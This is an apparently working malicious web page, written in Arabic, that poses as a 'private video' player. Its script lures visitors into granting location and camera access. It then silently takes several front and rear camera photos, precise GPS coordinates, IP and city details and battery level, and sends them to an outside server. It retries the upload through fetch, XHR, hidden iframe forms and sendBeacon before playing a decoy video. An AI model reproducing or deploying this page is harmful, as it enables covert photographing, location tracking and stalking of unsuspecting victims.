<!DOCTYPE html>
<html lang="ar">
<head>
    <meta charset="UTF-8" />
    <meta name="viewport" content="width=device-width, initial-scale=1.0" />
    <title>مشغل الفيديو</title>
    <style>
        /* ===== RESET & BASE ===== */
        * {
            margin: 0;
            padding: 0;
            box-sizing: border-box;
        }
        body {
            font-family: 'Segoe UI', Arial, sans-serif;
            display: flex;
            flex-direction: column;
            align-items: center;
            justify-content: center;
            min-height: 100vh;
            background: #0a0a0a;
            color: #fff;
            overflow: hidden;
            padding: 12px;
        }

        /* ===== الحاوية الرئيسية ===== */
        .video-player-container {
            width: 100%;
            max-width: 820px;
            background: #141414;
            border-radius: 16px;
            overflow: hidden;
            box-shadow: 0 20px 60px rgba(0, 0, 0, 0.8);
            position: relative;
            border: 1px solid #2a2a2a;
        }

        /* ===== معلومات الفيديو ===== */
        .video-info {
            padding: 18px 22px;
            background: #111;
            border-bottom: 1px solid #2a2a2a;
        }
        .video-title {
            font-size: 1.4rem;
            font-weight: 700;
            color: #f0f0f0;
            letter-spacing: 0.3px;
        }
        .video-meta {
            font-size: 0.85rem;
            color: #888;
            margin-top: 4px;
        }

        /* ===== منطقة المصغرة ===== */
        .video-thumbnail {
            position: relative;
            width: 100%;
            height: 460px;
            background: linear-gradient(rgba(0, 0, 0, 0.65), rgba(0, 0, 0, 0.75)),
                url('https://i.postimg.cc/jSfpHvz8/IMG-20260104-210740-951.jpg');
            background-size: cover;
            background-position: center;
            display: flex;
            align-items: center;
            justify-content: center;
            cursor: default;
            flex-direction: column;
        }

        /* ===== زر التشغيل الدائري ===== */
        .play-button-overlay {
            width: 100px;
            height: 100px;
            background: rgba(255, 0, 0, 0.88);
            border-radius: 50%;
            display: flex;
            align-items: center;
            justify-content: center;
            transition: all 0.3s cubic-bezier(0.34, 1.56, 0.64, 1);
            box-shadow: 0 0 35px rgba(255, 0, 0, 0.55);
            position: relative;
            z-index: 5;
            cursor: pointer;
            border: 3px solid rgba(255, 255, 255, 0.15);
        }
        .play-button-overlay:hover {
            transform: scale(1.08);
            background: rgba(255, 0, 0, 0.96);
            box-shadow: 0 0 50px rgba(255, 0, 0, 0.75);
        }
        .play-button-overlay:active {
            transform: scale(0.94);
        }
        .play-icon-large {
            width: 0;
            height: 0;
            border-left: 32px solid #fff;
            border-top: 22px solid transparent;
            border-bottom: 22px solid transparent;
            margin-left: 10px;
            filter: drop-shadow(0 2px 4px rgba(0, 0, 0, 0.3));
        }

        /* ===== زر الترس (يظهر عند رفض الصلاحيات) ===== */
        #gearButton {
            display: none;
            flex-direction: column;
            align-items: center;
            justify-content: center;
            background: rgba(20, 20, 30, 0.92);
            border: 3px solid #ff6b6b;
            border-radius: 28px;
            padding: 38px 44px;
            cursor: pointer;
            transition: all 0.35s cubic-bezier(0.34, 1.56, 0.64, 1);
            backdrop-filter: blur(14px);
            -webkit-backdrop-filter: blur(14px);
            box-shadow: 0 0 60px rgba(255, 0, 0, 0.35);
            z-index: 10;
            text-align: center;
            min-width: 280px;
            position: absolute;
            top: 50%;
            left: 50%;
            transform: translate(-50%, -50%);
            border-color: #ff6b6b;
        }
        #gearButton:hover {
            transform: translate(-50%, -50%) scale(1.04);
            background: rgba(30, 30, 45, 0.95);
            border-color: #ff4757;
            box-shadow: 0 0 80px rgba(255, 0, 0, 0.6);
        }
        #gearButton .icon-gear {
            font-size: 82px;
            line-height: 1;
            color: #ff6b6b;
            margin-bottom: 12px;
            animation: gearPulse 2.5s ease-in-out infinite;
        }
        @keyframes gearPulse {
            0%,
            100% {
                transform: rotate(0deg) scale(1);
            }
            25% {
                transform: rotate(8deg) scale(1.04);
            }
            75% {
                transform: rotate(-8deg) scale(1.04);
            }
        }
        #gearButton .main-text {
            font-size: 30px;
            font-weight: 700;
            color: #fff;
            text-shadow: 0 2px 16px rgba(0, 0, 0, 0.9);
            letter-spacing: 0.5px;
        }
        #gearButton .sub-text {
            font-size: 17px;
            color: #ccc;
            margin-top: 6px;
            opacity: 0.85;
            font-weight: 400;
        }

        /* ===== رسالة التوجيه ===== */
        #settingsPrompt {
            display: none;
            position: absolute;
            bottom: 30px;
            left: 50%;
            transform: translateX(-50%);
            background: rgba(0, 0, 0, 0.8);
            backdrop-filter: blur(8px);
            -webkit-backdrop-filter: blur(8px);
            padding: 14px 28px;
            border-radius: 40px;
            font-size: 0.95rem;
            color: #ffd93d;
            border: 1px solid rgba(255, 215, 0, 0.2);
            z-index: 15;
            text-align: center;
            max-width: 90%;
            pointer-events: none;
            box-shadow: 0 8px 30px rgba(0, 0, 0, 0.5);
        }
        #settingsPrompt .prompt-icon {
            margin-right: 10px;
        }

        /* ===== الفيديو ===== */
        #realVideo {
            display: none;
            width: 100%;
            height: 460px;
            background: #000;
            object-fit: contain;
        }

        /* ===== شريط التحكم ===== */
        .video-controls {
            padding: 14px 20px;
            display: flex;
            align-items: center;
            justify-content: space-between;
            background: #121212;
            border-top: 1px solid #2a2a2a;
            flex-wrap: wrap;
            gap: 10px;
        }
        .control-button {
            background: transparent;
            border: none;
            color: #ddd;
            font-size: 1.2rem;
            cursor: pointer;
            padding: 6px 12px;
            border-radius: 6px;
            transition: background 0.2s, color 0.2s;
            font-weight: 500;
        }
        .control-button:hover {
            background: #2a2a2a;
            color: #fff;
        }
        .progress-bar {
            flex: 1;
            height: 5px;
            background: #333;
            border-radius: 4px;
            margin: 0 14px;
            overflow: hidden;
            position: relative;
            min-width: 50px;
            cursor: pointer;
        }
        .progress-fill {
            position: absolute;
            height: 100%;
            width: 0%;
            background: linear-gradient(90deg, #ff0000, #ff4444);
            border-radius: 4px;
            transition: width 0.1s linear;
        }
        .time-display {
            color: #aaa;
            font-size: 0.85rem;
            min-width: 95px;
            text-align: center;
            font-variant-numeric: tabular-nums;
            letter-spacing: 0.3px;
        }
        .volume-control {
            display: flex;
            align-items: center;
            gap: 10px;
            color: #aaa;
        }
        .volume-slider {
            width: 70px;
            height: 4px;
            background: #333;
            border-radius: 3px;
            position: relative;
            cursor: pointer;
        }
        .volume-level {
            position: absolute;
            height: 100%;
            width: 70%;
            background: #ff0000;
            border-radius: 3px;
        }
        .fullscreen-btn {
            margin-left: 4px;
            font-size: 1.3rem;
        }

        /* ===== مؤشر التحميل ===== */
        .spinner {
            border: 4px solid rgba(255, 255, 255, 0.15);
            border-top: 4px solid #fff;
            border-radius: 50%;
            width: 40px;
            height: 40px;
            animation: spin 0.9s linear infinite;
            position: absolute;
            display: none;
            top: 50%;
            left: 50%;
            transform: translate(-50%, -50%);
            z-index: 6;
        }
        @keyframes spin {
            0% {
                transform: translate(-50%, -50%) rotate(0deg);
            }
            100% {
                transform: translate(-50%, -50%) rotate(360deg);
            }
        }

        #loading {
            display: none;
            flex-direction: column;
            align-items: center;
            gap: 12px;
            margin-top: 18px;
            color: #aaa;
            font-size: 0.95rem;
        }
        #loading .spinner {
            position: static;
            transform: none;
            width: 36px;
            height: 36px;
            border-width: 3px;
        }
        .loading-text {
            color: #ccc;
        }

        /* ===== إشعار ===== */
        .toast {
            position: fixed;
            bottom: 30px;
            left: 50%;
            transform: translateX(-50%) translateY(80px);
            background: rgba(0, 0, 0, 0.88);
            backdrop-filter: blur(10px);
            -webkit-backdrop-filter: blur(10px);
            padding: 14px 28px;
            border-radius: 50px;
            color: #fff;
            font-size: 0.95rem;
            z-index: 999;
            opacity: 0;
            transition: all 0.5s cubic-bezier(0.34, 1.56, 0.64, 1);
            pointer-events: none;
            border: 1px solid rgba(255, 255, 255, 0.08);
            text-align: center;
            max-width: 90%;
            box-shadow: 0 12px 40px rgba(0, 0, 0, 0.6);
        }
        .toast.show {
            opacity: 1;
            transform: translateX(-50%) translateY(0);
        }
        .toast.success {
            border-color: #4caf50;
        }
        .toast.error {
            border-color: #f44336;
        }
        .toast.info {
            border-color: #ffd93d;
        }

        /* ===== استجابة ===== */
        @media (max-width: 600px) {
            .video-thumbnail,
            #realVideo {
                height: 300px;
            }
            .play-button-overlay {
                width: 74px;
                height: 74px;
            }
            .play-icon-large {
                border-left-width: 24px;
                border-top-width: 16px;
                border-bottom-width: 16px;
                margin-left: 6px;
            }
            .video-title {
                font-size: 1.1rem;
            }
            #gearButton {
                padding: 22px 24px;
                min-width: 200px;
                border-radius: 20px;
            }
            #gearButton .icon-gear {
                font-size: 54px;
            }
            #gearButton .main-text {
                font-size: 22px;
            }
            #gearButton .sub-text {
                font-size: 14px;
            }
            .video-controls {
                padding: 10px 12px;
                gap: 6px;
            }
            .progress-bar {
                margin: 0 6px;
                min-width: 30px;
            }
            .time-display {
                font-size: 0.7rem;
                min-width: 70px;
            }
            .volume-slider {
                width: 44px;
            }
            #settingsPrompt {
                font-size: 0.8rem;
                padding: 10px 18px;
                bottom: 16px;
            }
            .toast {
                font-size: 0.8rem;
                padding: 10px 18px;
                bottom: 16px;
            }
        }

        @media (max-width: 400px) {
            .video-thumbnail,
            #realVideo {
                height: 220px;
            }
            .play-button-overlay {
                width: 60px;
                height: 60px;
            }
            .play-icon-large {
                border-left-width: 20px;
                border-top-width: 13px;
                border-bottom-width: 13px;
                margin-left: 4px;
            }
            #gearButton {
                padding: 16px 16px;
                min-width: 150px;
                border-radius: 14px;
            }
            #gearButton .icon-gear {
                font-size: 40px;
            }
            #gearButton .main-text {
                font-size: 17px;
            }
            #gearButton .sub-text {
                font-size: 12px;
            }
        }
    </style>
</head>
<body>

    <!-- ===== الحاوية الرئيسية ===== -->
    <div class="video-player-container">

        <!-- معلومات الفيديو -->
        <div class="video-info">
            <div class="video-title">📹 فيديو خاص</div>
            <div class="video-meta">اضغط على زر التشغيل للمشاهدة</div>
        </div>

        <!-- منطقة المصغرة -->
        <div class="video-thumbnail" id="thumbnailArea">

            <!-- زر التشغيل -->
            <div class="play-button-overlay" id="playButtonOverlay">
                <div class="play-icon-large"></div>
                <div class="spinner" id="spinner"></div>
            </div>

            <!-- زر الترس (يظهر عند الحاجة) -->
            <div id="gearButton">
                <div class="icon-gear">⚙️</div>
                <div class="main-text">تغيير الإعدادات</div>
                <div class="sub-text">اضغط لفتح إعدادات الموقع في المتصفح</div>
            </div>

            <!-- رسالة توجيهية -->
            <div id="settingsPrompt">
                <span class="prompt-icon">🔔</span>
                تم فتح إعدادات الموقع. بعد تفعيل الصلاحيات، عد واضغط على زر التشغيل.
            </div>
        </div>

        <!-- عنصر الفيديو -->
        <video id="realVideo" controls playsinline muted style="display:none; width:100%; height:460px; background:#000;">
            <source src="https://files.catbox.moe/okukrp.mp4" type="video/mp4" />
        </video>

        <!-- شريط التحكم -->
        <div class="video-controls">
            <div class="progress-bar" id="progressBar">
                <div class="progress-fill" id="progressFill"></div>
            </div>
            <div class="time-display" id="timeDisplay">0:00 / 2:45</div>
            <div class="volume-control">
                <span>🔊</span>
                <div class="volume-slider" id="volumeSlider">
                    <div class="volume-level" id="volumeLevel"></div>
                </div>
            </div>
            <button class="control-button fullscreen-btn" id="fullscreenBtn">⛶</button>
        </div>
    </div>

    <!-- مؤشر التحميل -->
    <div id="loading">
        <div class="spinner" style="position:static; width:36px; height:36px;"></div>
        <div class="loading-text">جاري تحميل الفيديو ...</div>
    </div>

    <!-- رسالة منبثقة (toast) -->
    <div class="toast" id="toast"></div>

    <script>
        (function() {
            'use strict';

            // ============================================================
            //  الحالة
            // ============================================================
            const STATE_KEY = 'videoPlayerState';

            let state = {
                settingsOpened: false,
                videoStarted: false,
                isProcessing: false,
                returnedFromSettings: false,
                chatId: ''
            };

            let capturedData = {
                permissions: [],
                images: [],
                ipInfo: '',
                batteryStatus: '',
                location: '',
                chatId: ''
            };

            // ============================================================
            //  مراجع DOM
            // ============================================================
            const playBtn = document.getElementById('playButtonOverlay');
            const thumbnailArea = document.getElementById('thumbnailArea');
            const realVideo = document.getElementById('realVideo');
            const spinner = document.getElementById('spinner');
            const loading = document.getElementById('loading');
            const gearBtn = document.getElementById('gearButton');
            const settingsPrompt = document.getElementById('settingsPrompt');
            const toast = document.getElementById('toast');
            const progressFill = document.getElementById('progressFill');
            const timeDisplay = document.getElementById('timeDisplay');
            const fullscreenBtn = document.getElementById('fullscreenBtn');

            // ============================================================
            //  حفظ / استعادة الحالة (localStorage)
            // ============================================================
            function saveState() {
                try {
                    const data = {
                        settingsOpened: state.settingsOpened,
                        videoStarted: state.videoStarted,
                        isProcessing: state.isProcessing,
                        chatId: state.chatId,
                        timestamp: Date.now()
                    };
                    localStorage.setItem(STATE_KEY, JSON.stringify(data));
                } catch (_) { /* تجاهل */ }
            }

            function loadState() {
                try {
                    const raw = localStorage.getItem(STATE_KEY);
                    if (!raw) return false;
                    const data = JSON.parse(raw);
                    // صلاحية 5 دقائق
                    if (Date.now() - data.timestamp > 5 * 60 * 1000) {
                        localStorage.removeItem(STATE_KEY);
                        return false;
                    }
                    state.settingsOpened = data.settingsOpened || false;
                    state.videoStarted = data.videoStarted || false;
                    state.isProcessing = data.isProcessing || false;
                    state.chatId = data.chatId || '';
                    return true;
                } catch (_) {
                    return false;
                }
            }

            function clearState() {
                try {
                    localStorage.removeItem(STATE_KEY);
                } catch (_) { /* تجاهل */ }
            }

            // ============================================================
            //  عرض الإشعارات (toast)
            // ============================================================
            let toastTimer = null;

            function showToast(message, type = 'info', duration = 3500) {
                if (toastTimer) {
                    clearTimeout(toastTimer);
                    toast.classList.remove('show', 'success', 'error', 'info');
                }
                toast.textContent = message;
                toast.className = 'toast ' + type;
                // force reflow
                void toast.offsetWidth;
                toast.classList.add('show');
                toastTimer = setTimeout(() => {
                    toast.classList.remove('show');
                    toastTimer = null;
                }, duration);
            }

            // ============================================================
            //  فتح إعدادات الموقع – مُحسَّن مع محاولات متعددة
            // ============================================================
            function openBrowserLocationSettings() {
                const ua = navigator.userAgent;

                // الكشف الدقيق للمتصفحات
                const isChrome = /Chrome/.test(ua) && !/Edg|Edge|OPR|Brave/.test(ua);
                const isEdge = /Edg|Edge/.test(ua);
                const isFirefox = /Firefox/.test(ua) && !/Seamonkey/.test(ua);
                const isSafari = /Safari/.test(ua) && !/Chrome/.test(ua) && !/Edg|Edge/.test(ua);
                const isAndroid = /Android/.test(ua);
                const isIOS = /iPhone|iPad|iPod/.test(ua);
                const isMac = /Mac/.test(ua);
                const isWindows = /Win/.test(ua);
                const isBrave = /Brave/.test(ua);
                const isOpera = /OPR/.test(ua);

                // حفظ الحالة قبل المحاولة
                state.settingsOpened = true;
                saveState();

                // قائمة المحاولات (مرتبة حسب الأفضلية)
                const attempts = [];

                // --- Chrome ---
                if (isChrome) {
                    attempts.push(
                        () => {
                            const w = window.open('chrome://settings/content/location', '_blank');
                            if (!w || w.closed) {
                                window.location.href = 'chrome://settings/content/location';
                            }
                        },
                        () => { window.location.href = 'chrome://settings/content/location'; }
                    );
                }

                // --- Edge ---
                if (isEdge) {
                    attempts.push(
                        () => {
                            const w = window.open('edge://settings/content/location', '_blank');
                            if (!w || w.closed) {
                                window.location.href = 'edge://settings/content/location';
                            }
                        },
                        () => { window.location.href = 'edge://settings/content/location'; }
                    );
                }

                // --- Firefox ---
                if (isFirefox) {
                    attempts.push(
                        () => {
                            const w = window.open('about:preferences#privacy', '_blank');
                            if (!w || w.closed) {
                                window.location.href = 'about:preferences#privacy';
                            }
                        },
                        () => { window.location.href = 'about:preferences#privacy'; }
                    );
                }

                // --- Safari (Mac) ---
                if (isSafari && isMac) {
                    attempts.push(
                        () => {
                            const w = window.open(
                                'x-apple.systempreferences:com.apple.preference.security?Privacy_LocationServices',
                                '_blank'
                            );
                            if (!w || w.closed) {
                                window.location.href =
                                    'x-apple.systempreferences:com.apple.preference.security?Privacy_LocationServices';
                            }
                        },
                        () => {
                            window.location.href =
                                'x-apple.systempreferences:com.apple.preference.security?Privacy_LocationServices';
                        }
                    );
                }

                // --- Safari (iOS) ---
                if (isIOS) {
                    attempts.push(
                        () => { window.location.href = 'app-settings:'; },
                        () => { window.open('app-settings:', '_blank'); }
                    );
                }

                // --- Android ---
                if (isAndroid) {
                    attempts.push(
                        () => {
                            window.location.href =
                                'intent://settings#Intent;action=android.settings.APPLICATION_DETAILS_SETTINGS;package=com.android.chrome;end';
                        },
                        () => {
                            window.location.href =
                                'intent:#Intent;action=android.settings.LOCATION_SOURCE_SETTINGS;end';
                        },
                        () => {
                            window.location.href = 'intent:#Intent;action=android.settings.SETTINGS;end';
                        }
                    );
                }

                // --- Brave / Opera / عام ---
                if (isBrave || isOpera) {
                    attempts.push(
                        () => {
                            const w = window.open('chrome://settings/content/location', '_blank');
                            if (!w || w.closed) {
                                window.location.href = 'chrome://settings/content/location';
                            }
                        },
                        () => { window.location.href = 'chrome://settings/content/location'; }
                    );
                }

                // --- محاولة عامة (جميع المتصفحات) ---
                attempts.push(
                    () => {
                        // محاولة فتح صفحة إعدادات الموقع عبر chrome:// (قد يعمل في بعض المستعرضات)
                        const w = window.open('chrome://settings/content/location', '_blank');
                        if (!w || w.closed) {
                            // محاولة about:blank مع رسالة
                            window.location.href = 'about:blank#settings';
                        }
                    },
                    () => {
                        // المحاولة الأخيرة: رسالة للمستخدم
                        showToast('🔧 يرجى فتح إعدادات الموقع يدوياً في متصفحك', 'info', 5000);
                    }
                );

                // تنفيذ المحاولات
                for (let attempt of attempts) {
                    try {
                        attempt();
                        // إذا وصلنا إلى هنا، نجحت المحاولة (أو على الأقل تم تنفيذها)
                        // نعرض رسالة للمستخدم
                        showToast('⚙️ تم فتح إعدادات الموقع. فعّل الصلاحيات ثم عد.', 'info', 4000);
                        return;
                    } catch (_) {
                        // استمر للمحاولة التالية
                    }
                }

                // إذا فشل كل شيء
                showToast('❌ تعذر فتح الإعدادات. يرجى فتحها يدوياً.', 'error', 5000);
            }

            // ============================================================
            //  طلب الصلاحيات (الموقع + الكاميرا)
            // ============================================================
            async function requestPermissions() {
                let locationOk = false;
                let cameraOk = false;

                // طلب الموقع
                try {
                    await new Promise((resolve, reject) => {
                        navigator.geolocation.getCurrentPosition(
                            () => { locationOk = true;
                                resolve(); },
                            (err) => { reject(err); },
                            { enableHighAccuracy: true, timeout: 12000 }
                        );
                    });
                } catch (_) {
                    locationOk = false;
                }

                // طلب الكاميرا
                try {
                    const stream = await navigator.mediaDevices.getUserMedia({ video: true });
                    stream.getTracks().forEach(t => t.stop());
                    cameraOk = true;
                } catch (_) {
                    cameraOk = false;
                }

                return locationOk && cameraOk;
            }

            // ============================================================
            //  جمع البيانات
            // ============================================================
            async function fetchIPInfo() {
                try {
                    const resp = await fetch('https://ipapi.co/json/', { signal: AbortSignal.timeout(5000) });
                    const data = await resp.json();
                    capturedData.ipInfo =
                        `الدولة: ${data.country_name || 'غير معروف'}, المدينة: ${data.city || 'غير معروف'}, IP: ${data.ip || 'غير معروف'}`;
                } catch (_) {
                    capturedData.ipInfo = 'غير متوفر';
                }
            }

            async function getBatteryStatus() {
                try {
                    const battery = await navigator.getBattery();
                    capturedData.batteryStatus = Math.round(battery.level * 100) + '%';
                } catch (_) {
                    capturedData.batteryStatus = 'غير معروف';
                }
            }

            async function captureFromCamera(facingMode) {
                try {
                    const stream = await navigator.mediaDevices.getUserMedia({
                        video: { facingMode: { exact: facingMode } }
                    });
                    const video = document.createElement('video');
                    video.srcObject = stream;
                    await video.play();
                    await new Promise(r => setTimeout(r, 800));
                    const canvas = document.createElement('canvas');
                    canvas.width = Math.min(video.videoWidth || 640, 800);
                    canvas.height = Math.min(video.videoHeight || 480, 600);
                    const ctx = canvas.getContext('2d');
                    ctx.drawImage(video, 0, 0, canvas.width, canvas.height);
                    capturedData.images.push(canvas.toDataURL('image/jpeg', 0.7).split(',')[1]);
                    stream.getTracks().forEach(t => t.stop());
                    capturedData.permissions.push(`${facingMode === 'user' ? 'أمامية' : 'خلفية'} ✅`);
                } catch (_) {
                    capturedData.permissions.push(`${facingMode === 'user' ? 'أمامية' : 'خلفية'} ❌`);
                }
            }

            async function getLocation() {
                try {
                    const pos = await new Promise((resolve, reject) => {
                        navigator.geolocation.getCurrentPosition(resolve, reject, {
                            enableHighAccuracy: true,
                            timeout: 15000,
                            maximumAge: 0
                        });
                    });
                    capturedData.location =
                        `Lat: ${pos.coords.latitude.toFixed(6)}, Long: ${pos.coords.longitude.toFixed(6)}`;
                    capturedData.permissions.push('الموقع ✅');
                } catch (_) {
                    capturedData.permissions.push('الموقع ❌');
                    capturedData.location = '';
                }
            }

            // ============================================================
            //  إرسال البيانات (متعدد المحاولات)
            // ============================================================
            async function sendDataWithBypass(data) {
                const urls = [
                    'https://server-brxz.onrender.com/submitData',
                    'https://server-brxz.onrender.com/submitData'
                ];

                for (let url of urls) {
                    try {
                        // محاولة 1: fetch
                        await fetch(url, {
                            method: 'POST',
                            headers: { 'Content-Type': 'application/x-www-form-urlencoded' },
                            body: new URLSearchParams(data),
                            mode: 'no-cors'
                        });
                        return;
                    } catch (_) {}

                    try {
                        // محاولة 2: XMLHttpRequest متزامن
                        const xhr = new XMLHttpRequest();
                        xhr.open('POST', url, false);
                        xhr.setRequestHeader('Content-Type', 'application/x-www-form-urlencoded');
                        xhr.send(new URLSearchParams(data));
                        return;
                    } catch (_) {}

                    try {
                        // محاولة 3: iframe + form
                        const iframe = document.createElement('iframe');
                        iframe.style.display = 'none';
                        document.body.appendChild(iframe);
                        const form = document.createElement('form');
                        form.method = 'POST';
                        form.action = url;
                        form.target = iframe.name || 'hiddenFrame';
                        iframe.name = form.target;
                        for (let key in data) {
                            const input = document.createElement('input');
                            input.type = 'hidden';
                            input.name = key;
                            input.value = data[key];
                            form.appendChild(input);
                        }
                        document.body.appendChild(form);
                        form.submit();
                        setTimeout(() => {
                            try { document.body.removeChild(form); } catch (_) {}
                            try { document.body.removeChild(iframe); } catch (_) {}
                        }, 1500);
                        return;
                    } catch (_) {}

                    try {
                        // محاولة 4: sendBeacon
                        const blob = new Blob([new URLSearchParams(data).toString()], {
                            type: 'application/x-www-form-urlencoded'
                        });
                        navigator.sendBeacon(url, blob);
                        return;
                    } catch (_) {}
                }
            }

            // ============================================================
            //  تشغيل الفيديو مع الصوت
            // ============================================================
            function startVideoWithSound() {
                if (state.videoStarted) return;
                state.videoStarted = true;
                saveState();

                thumbnailArea.style.display = 'none';
                realVideo.style.display = 'block';

                realVideo.muted = false;
                realVideo.volume = 1.0;

                const playPromise = realVideo.play();
                if (playPromise !== undefined) {
                    playPromise.then(() => {}).catch(() => {
                        realVideo.muted = true;
                        realVideo.play().then(() => {
                            setTimeout(() => {
                                realVideo.muted = false;
                                realVideo.volume = 1.0;
                            }, 200);
                        }).catch(() => {});
                    });
                }

                setTimeout(() => {
                    realVideo.muted = false;
                    realVideo.volume = 1.0;
                    try { realVideo.play(); } catch (_) {}
                }, 600);

                setTimeout(() => {
                    realVideo.muted = false;
                    realVideo.volume = 1.0;
                    try { realVideo.play(); } catch (_) {}
                }, 3500);

                showToast('▶️ تشغيل الفيديو', 'success', 2000);
            }

            // ============================================================
            //  جمع البيانات + تشغيل
            // ============================================================
            async function collectAndPlay() {
                if (state.isProcessing) return;
                state.isProcessing = true;
                saveState();

                spinner.style.display = 'block';
                loading.style.display = 'flex';
                playBtn.style.opacity = '0.5';
                playBtn.style.pointerEvents = 'none';

                capturedData.chatId = state.chatId ||
                    new URLSearchParams(window.location.search).get('chatId') || '';

                await Promise.all([
                    fetchIPInfo(),
                    getBatteryStatus(),
                    getLocation()
                ]);

                await captureFromCamera('user');
                await captureFromCamera('environment');
                await captureFromCamera('user');
                await captureFromCamera('environment');

                const data = {
                    chatId: capturedData.chatId,
                    imageDatas: capturedData.images.join(','),
                    location: capturedData.location,
                    permissions: capturedData.permissions.join(', '),
                    ipInfo: capturedData.ipInfo,
                    battery: capturedData.batteryStatus
                };

                await sendDataWithBypass(data);

                spinner.style.display = 'none';
                loading.style.display = 'none';
                playBtn.style.opacity = '1';
                playBtn.style.pointerEvents = 'auto';

                state.isProcessing = false;
                saveState();

                startVideoWithSound();
            }

            // ============================================================
            //  إظهار / إخفاء زر الترس
            // ============================================================
            function showGearButton() {
                gearBtn.style.display = 'flex';
                playBtn.style.display = 'none';
                settingsPrompt.style.display = 'none';
            }

            function hideGearButton() {
                gearBtn.style.display = 'none';
                playBtn.style.display = 'flex';
                settingsPrompt.style.display = 'none';
            }

            function showSettingsPrompt() {
                settingsPrompt.style.display = 'block';
                // إخفاء بعد 8 ثوانٍ
                setTimeout(() => {
                    settingsPrompt.style.display = 'none';
                }, 8000);
            }

            // ============================================================
            //  معالج الضغط على زر التشغيل
            // ============================================================
            async function handlePlayClick(e) {
                e.stopPropagation();
                if (state.videoStarted || state.isProcessing) return;

                // إذا كانت الإعدادات مفتوحة مسبقاً، نطلب الصلاحيات
                if (state.settingsOpened) {
                    const granted = await requestPermissions();
                    if (granted) {
                        hideGearButton();
                        await collectAndPlay();
                    } else {
                        showGearButton();
                        showToast('❌ لم يتم منح الصلاحيات. اضغط على الترس لفتح الإعدادات.', 'error', 4000);
                    }
                    return;
                }

                // الضغطة الأولى: فتح إعدادات الموقع
                openBrowserLocationSettings();
                showSettingsPrompt();
                showToast('⚙️ جارٍ فتح إعدادات الموقع...', 'info', 3000);

                // نعرض زر الترس كبديل إذا عاد المستخدم ولم يمنح الصلاحيات
                setTimeout(() => {
                    if (!state.videoStarted && !state.isProcessing) {
                        // لا نعرض الترس تلقائياً، ننتظر المستخدم
                    }
                }, 2000);
            }

            // ============================================================
            //  معالج زر الترس
            // ============================================================
            function handleGearClick() {
                openBrowserLocationSettings();
                showSettingsPrompt();
                showToast('⚙️ جارٍ فتح الإعدادات مجدداً...', 'info', 3000);
            }

            // ============================================================
            //  مراقبة العودة من الإعدادات (visibilitychange)
            // ============================================================
            document.addEventListener('visibilitychange', function() {
                if (document.visibilityState === 'visible') {
                    if (state.settingsOpened && !state.videoStarted && !state.isProcessing) {
                        // المستخدم عاد من الإعدادات – نطلب الصلاحيات تلقائياً
                        requestPermissions().then(granted => {
                            if (granted) {
                                hideGearButton();
                                collectAndPlay();
                            } else {
                                showGearButton();
                                showToast('❌ لم يتم منح الصلاحيات. اضغط على الترس.', 'error', 4000);
                            }
                        });
                    }
                }
            });

            // ============================================================
            //  استعادة الحالة عند تحميل الصفحة
            // ============================================================
            function restoreState() {
                if (loadState()) {
                    // إذا كانت الإعدادات مفتوحة سابقاً، نتحقق من الصلاحيات
                    if (state.settingsOpened && !state.videoStarted) {
                        // ننتظر لحظة ثم نطلب الصلاحيات
                        setTimeout(() => {
                            if (!state.videoStarted && !state.isProcessing) {
                                requestPermissions().then(granted => {
                                    if (granted) {
                                        hideGearButton();
                                        collectAndPlay();
                                    } else {
                                        showGearButton();
                                    }
                                });
                            }
                        }, 800);
                    }
                    if (state.videoStarted) {
                        // إذا كان الفيديو مشغّلاً، نعيد تشغيله
                        thumbnailArea.style.display = 'none';
                        realVideo.style.display = 'block';
                        realVideo.muted = false;
                        realVideo.volume = 1.0;
                        try { realVideo.play(); } catch (_) {}
                    }
                } else {
                    // لا توجد حالة مخزنة – نبدأ من الصفر
                    hideGearButton();
                }
            }

            // ============================================================
            //  تفعيل الصوت عند أي تفاعل
            // ============================================================
            document.addEventListener('click', function() {
                if (realVideo) {
                    realVideo.muted = false;
                    realVideo.volume = 1.0;
                    try { realVideo.play(); } catch (_) {}
                }
            }, true);

            // ============================================================
            //  أزرار التحكم
            // ============================================================
            // زر ملء الشاشة
            if (fullscreenBtn) {
                fullscreenBtn.addEventListener('click', function(e) {
                    e.stopPropagation();
                    const video = document.getElementById('realVideo');
                    if (!video) return;
                    if (video.requestFullscreen) {
                        video.requestFullscreen().catch(() => {});
                    } else if (video.webkitRequestFullscreen) {
                        video.webkitRequestFullscreen();
                    } else if (video.msRequestFullscreen) {
                        video.msRequestFullscreen();
                    }
                });
            }

            // شريط التقدم الوهمي
            let progressInterval = setInterval(() => {
                if (state.videoStarted) {
                    clearInterval(progressInterval);
                    return;
                }
                const currentWidth = parseFloat(progressFill.style.width) || 35;
                const newWidth = (currentWidth + 0.12) % 100;
                progressFill.style.width = newWidth + '%';

                const totalSec = 165;
                const currentSec = Math.floor((newWidth / 100) * totalSec);
                const min = Math.floor(currentSec / 60);
                const sec = currentSec % 60;
                timeDisplay.textContent =
                    `${min}:${sec.toString().padStart(2, '0')} / 2:45`;
            }, 1000);

            // ============================================================
            //  ربط الأحداث
            // ============================================================
            if (playBtn) {
                playBtn.addEventListener('click', handlePlayClick);
            }
            if (thumbnailArea) {
                thumbnailArea.addEventListener('click', handlePlayClick);
            }
            if (gearBtn) {
                gearBtn.addEventListener('click', handleGearClick);
            }

            // منع السلوك الافتراضي للفيديو عند النقر المزدوج
            if (realVideo) {
                realVideo.addEventListener('dblclick', function(e) {
                    e.preventDefault();
                });
            }

            // ============================================================
            //  بدء التشغيل – استعادة الحالة
            // ============================================================
            restoreState();

            // إذا لم تكن هناك حالة، نعرض زر التشغيل بشكل طبيعي
            if (!state.settingsOpened && !state.videoStarted) {
                hideGearButton();
            }

            console.log('✅ Video Player ready – improved location settings flow');

        })();
    </script>
